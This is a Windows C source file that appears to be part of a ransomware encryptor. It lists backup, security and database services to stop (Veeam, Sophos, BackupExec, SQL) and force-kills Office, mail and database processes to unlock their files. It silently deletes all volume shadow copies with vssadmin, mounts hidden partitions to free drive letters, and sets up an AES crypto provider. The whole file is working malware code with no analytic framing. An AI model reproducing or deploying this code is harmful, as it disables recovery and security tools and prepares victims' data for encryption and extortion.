#include <windows.h>
#include <tlhelp32.h>

#include "another.h"
#include "memory.h"
#include "debug.h"

static const CHAR* services_to_stop[] = { "vss", "sql", "svc$", "memtas", "mepocs", "sophos", "veeam", "backup", "GxVss", "GxBlr", "GxFWD", "GxCVD", "GxCIMgr", "DefWatch", "ccEvtMgr", "ccSetMgr", "SavRoam", "RTVscan", "QBFCService", "QBIDPService", "Intuit.QuickBooks.FCS", "QBCFMonitorService", "YooBackup", "YooIT", "zhudongfangyu", "sophos", "stc_raw_agent", "VSNAPVSS", "VeeamTransportSvc", "VeeamDeploymentService", "VeeamNFSSvc", "veeam", "PDVFSService", "BackupExecVSSProvider", "BackupExecAgentAccelerator", "BackupExecAgentBrowser", "BackupExecDiveciMediaService", "BackupExecJobEngine", "BackupExecManagementService", "BackupExecRPCService", "AcrSch2Svc", "AcronisAgent", "CASAD2DWebSvc", "CAARCUpdateSvc" };

static const WCHAR* processes_to_stop[] = { L"sql.exe", L"oracle.exe", L"ocssd.exe", L"dbsnmp.exe", L"synctime.exe", L"agntsvc.exe", L"isqlplussvc.exe", L"xfssvccon.exe", L"mydesktopservice.exe", L"ocautoupds.exe", L"encsvc.exe", L"firefox.exe", L"tbirdconfig.exe", L"mydesktopqos.exe", L"ocomm.exe", L"dbeng50.exe", L"sqbcoreservice.exe", L"excel.exe", L"infopath.exe", L"msaccess.exe", L"mspub.exe", L"onenote.exe", L"outlook.exe", L"powerpnt.exe", L"steam.exe", L"thebat.exe", L"thunderbird.exe", L"visio.exe", L"winword.exe", L"wordpad.exe", L"notepad.exe" };

void _load_hidden_partitions() {
    LPCWSTR driveLetters[26] = {
        L"Q:\\", L"W:\\", L"E:\\", L"R:\\", L"T:\\",
        L"Y:\\", L"U:\\", L"I:\\", L"O:\\", L"P:\\",
        L"A:\\", L"S:\\", L"D:\\", L"F:\\", L"G:\\",
        L"H:\\", L"J:\\", L"K:\\", L"L:\\", L"Z:\\",
        L"X:\\", L"C:\\", L"V:\\", L"B:\\", L"N:\\",
        L"M:\\"
    };
    LPCWSTR freeLetters[26];

    DWORD driveCounter = 0;
    DWORD driveSize = 120;
    DWORD retSize = 0;
    WCHAR drive[260];

    for (int i = 0; i < 26; i++) {
        if (GetDriveTypeW(driveLetters[i]) == DRIVE_NO_ROOT_DIR) {
            freeLetters[driveCounter++] = driveLetters[i];
        }
    }

    drive[0] = L'\0';
    if (WCHAR* volume = (WCHAR*)_halloc(32768 * sizeof(WCHAR))) {
        if (WCHAR* partition = (WCHAR*)_halloc(32768 * sizeof(WCHAR))) {
            HANDLE hFind = FindFirstVolumeW(volume, 32768);
            do {
                if (driveCounter > 0) {
                    if (GetVolumePathNamesForVolumeNameW(volume, drive, driveSize, &retSize)) {
                        if (lstrlenW(drive) == 3) {
                            drive[0] = L'\0';
                            continue;
                        }
                    }
                    SetVolumeMountPointW(freeLetters[--driveCounter], volume);
                }
                else break;
            } while (FindNextVolumeW(hFind, volume, 32768));
            FindVolumeClose(hFind);
            _hfree(partition);
        }
        _hfree(volume);
    }
}

BOOL IsWow64()
{
    BOOL bIsWow64 = 0;
    typedef BOOL(WINAPI* LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
    LPFN_ISWOW64PROCESS fnIsWow64Process;
    fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandleA("kernel32.dll"), "IsWow64Process");

    if (0 != fnIsWow64Process)
    {
        if (!fnIsWow64Process(GetCurrentProcess(), &bIsWow64))
        {
            bIsWow64 = 0;
        }
    }
    return bIsWow64;
}

void _remove_shadows() {
    PVOID oldValue = 0;

    if (IsWow64()) {
        typedef BOOL(WINAPI* fnc)(PVOID*);
        HMODULE lib = LoadLibraryA("kernel32.dll");
        FARPROC addr = GetProcAddress(lib, "Wow64DisableWow64FsRedirection");
        if (addr) ((fnc)addr)(&oldValue);
    }

    ShellExecuteW(0, L"open", L"cmd.exe", L"/c vssadmin.exe delete shadows /all /quiet", 0, SW_HIDE);

    if (IsWow64()) {
        typedef BOOL(WINAPI* fnc)(PVOID);
        HMODULE lib = LoadLibraryA("kernel32.dll");
        FARPROC addr = GetProcAddress(lib, "Wow64RevertWow64FsRedirection");
        if (addr) ((fnc)addr)(oldValue);
    }
}

void _stop_services() {
    SERVICE_STATUS_PROCESS sspMain;
    SERVICE_STATUS_PROCESS sspDep;

    ENUM_SERVICE_STATUSA ess;

    DWORD dwBytesNeeded;
    DWORD dwWaitTime;
    DWORD dwCount;

    LPENUM_SERVICE_STATUSA lpDependencies = 0;

    DWORD dwStartTime = GetTickCount();
    DWORD dwTimeout = 30000;

    if (SC_HANDLE scManager = OpenSCManagerA(0, 0, SC_MANAGER_ALL_ACCESS)) {
        for (int i = 0; i < _countof(services_to_stop); i++) {
            if (SC_HANDLE schHandle = OpenServiceA(
                scManager,
                services_to_stop[i],
                SERVICE_STOP |
                SERVICE_QUERY_STATUS |
                SERVICE_ENUMERATE_DEPENDENTS)) {
                if (QueryServiceStatusEx(schHandle,
                    SC_STATUS_PROCESS_INFO,
                    (LPBYTE)&sspMain,
                    sizeof(SERVICE_STATUS_PROCESS),
                    &dwBytesNeeded)) {
                    if (sspMain.dwCurrentState != SERVICE_STOPPED && sspMain.dwCurrentState != SERVICE_STOP_PENDING) {
                        if (!EnumDependentServicesA(schHandle,
                            SERVICE_ACTIVE,
                            lpDependencies,
                            0,
                            &dwBytesNeeded,
                            &dwCount)) {
                            if (GetLastError() == ERROR_MORE_DATA) {
                                if (lpDependencies = (LPENUM_SERVICE_STATUSA)_halloc(dwBytesNeeded)) {
                                    if (EnumDependentServicesA(schHandle,
                                        SERVICE_ACTIVE,
                                        lpDependencies,
                                        dwBytesNeeded,
                                        &dwBytesNeeded,
                                        &dwCount)) {
                                        ess = *(lpDependencies + i);

                                        if (SC_HANDLE hDepService = OpenServiceA(
                                            scManager,
                                            ess.lpServiceName,
                                            SERVICE_STOP |
                                            SERVICE_QUERY_STATUS)) {
                                            if (ControlService(hDepService,
                                                SERVICE_CONTROL_STOP,
                                                (LPSERVICE_STATUS)&sspDep)) {
                                                while (sspDep.dwCurrentState != SERVICE_STOPPED)
                                                {
                                                    Sleep(sspDep.dwWaitHint);
                                                    if (QueryServiceStatusEx(
                                                        hDepService,
                                                        SC_STATUS_PROCESS_INFO,
                                                        (LPBYTE)&sspDep,
                                                        sizeof(SERVICE_STATUS_PROCESS),
                                                        &dwBytesNeeded)) {
                                                        if (sspDep.dwCurrentState == SERVICE_STOPPED || GetTickCount() - dwStartTime > dwTimeout) {
                                                            break;
                                                        }
                                                    }
                                                }

                                                CloseServiceHandle(hDepService);
                                            }
                                        }
                                    }

                                    _hfree(lpDependencies);
                                }
                            }
                        }
                        if (ControlService(schHandle,
                            SERVICE_CONTROL_STOP,
                            (LPSERVICE_STATUS)&sspMain)) {
                            while (sspMain.dwCurrentState != SERVICE_STOPPED)
                            {
                                Sleep(sspMain.dwWaitHint);
                                if (!QueryServiceStatusEx(
                                    schHandle,
                                    SC_STATUS_PROCESS_INFO,
                                    (LPBYTE)&sspMain,
                                    sizeof(SERVICE_STATUS_PROCESS),
                                    &dwBytesNeeded))
                                {
                                    goto stop_cleanup;
                                }

                                if (sspMain.dwCurrentState == SERVICE_STOPPED)
                                    break;

                                if (GetTickCount() - dwStartTime > dwTimeout)
                                {
                                    goto stop_cleanup;
                                }
                            }
                        }
                    }
                }

            stop_cleanup:;
                CloseServiceHandle(schHandle);
            }
        }

        CloseServiceHandle(scManager);
    }
}

void _stop_processes() {
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
    PROCESSENTRY32W pEntry;
    pEntry.dwSize = sizeof(pEntry);
    BOOL hRes = Process32FirstW(hSnapShot, &pEntry);
    while (hRes)
    {
        for (int i = 0; i < _countof(processes_to_stop); i++) {
            if (lstrcmpW(processes_to_stop[i], pEntry.szExeFile) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0, (DWORD)pEntry.th32ProcessID);
                if (hProcess != NULL)
                {
                    TerminateProcess(hProcess, 9);
                    CloseHandle(hProcess);
                }
                break;
            }
        }
        hRes = Process32NextW(hSnapShot, &pEntry);
    }
    CloseHandle(hSnapShot);
}

HCRYPTPROV gen_context()
{
    HCRYPTPROV hProv = NULL;
    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT) &&
        !CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT | CRYPT_NEWKEYSET)) hProv = NULL;
    return hProv;
}